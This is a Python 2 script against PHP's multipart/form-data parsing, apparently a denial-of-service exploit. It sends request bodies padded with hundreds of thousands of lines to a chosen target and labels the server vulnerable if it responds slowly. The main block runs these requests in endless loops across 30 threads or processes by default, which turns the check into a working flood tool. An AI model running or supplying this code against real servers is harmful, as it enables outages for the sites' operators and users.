
import sys
import urllib, urllib2
import datetime
from threading import Thread
from multiprocessing import Process
from optparse import OptionParser
import random
import string


def http_proxy(proxy_url):
    proxy_handler = urllib2.ProxyHandler({"http": proxy_url})
    null_proxy_handler = urllib2.ProxyHandler({})
    opener = urllib2.build_opener(proxy_handler)
    urllib2.install_opener(opener)


def check_php_multipartform_dos(url, post_body, headers):
    req = urllib2.Request(url)
    for key in headers.keys():
        req.add_header(key, headers[key])
    starttime = datetime.datetime.now();
    try:
        fd = urllib2.urlopen(req, post_body)
    except urllib2.HTTPError, e:
        print e

    
    endtime = datetime.datetime.now()
    usetime = (endtime - starttime).seconds
    if usetime > 5:
        result = url + " is vulnerable"
    else:
        if usetime > 3:
            result = "need to check normal respond time"
        else:
            result = "normal"
    return [result, usetime]


def main(options, args):
    
    
    if options.target:
        target = options.target
    else:
        return

    num = options.lines

    headers = {'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryX3B7rDMPcQlzmJE1',
               'Accept-Encoding': 'gzip, deflate',
               'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36'}
    body = "------WebKitFormBoundaryX3B7rDMPcQlzmJE1\nContent-Disposition: form-data; name=\"file\"; filename=sp.jpg"
    ch = random.choice(string.ascii_lowercase)
    payload = "\n".join(ch * num)
    body += payload
    body += "Content-Type: application/octet-stream\r\n\r\ndatadata\r\n------WebKitFormBoundaryX3B7rDMPcQlzmJE1--"

    print "Starting..."
    respond = check_php_multipartform_dos(target, body, headers)
    print "Result: ",
    print respond[0]
    print "Respond time: " + str(respond[1]) + " seconds"


class WorkerMixin():
    def __init__(self, options, args):
        self.options = options
        self.args = args

    def run(self):
        while True:
            main(self.options, self.args)


class WorkerThread(WorkerMixin, Thread):
    def __init__(self, options, args):
        WorkerMixin.__init__(self, options, args)
        Thread.__init__(self)


class WorkerProcess(WorkerMixin, Process):
    def __init__(self, options, args):
        WorkerMixin.__init__(self, options, args)
        Process.__init__(self)


if __name__ == "__main__":
    parser = OptionParser()  
    parser.add_option("-t", "--target", action="store",
                      dest="target",
                      default=False,
                      type="string",
                      help="test target"
                      )

    parser.add_option("-l", "--lines", action="store",
                      dest="lines",
                      default=350000,
                      type="int",
                      help="lines of content"
                      )

    parser.add_option("-n", "--threads", action="store",
                      dest="threads",
                      default=30,
                      type="int",
                      help="number of threads"
                      )

    parser.add_option("-p", "--process", action="store_true",
                      dest="process",
                      default=False,
                      help="run it using process instead of thread"
                      )

    (options, args) = parser.parse_args()
    print "number of threads: %d" % options.threads
    print "number of lines: %d" % options.lines

    if options.process:
        print "running with Process"
        for i in xrange(options.threads):
            WorkerProcess(options, args).start()
    else:
        print "running with Thread"
        for i in xrange(options.threads):
            WorkerThread(options, args).start()
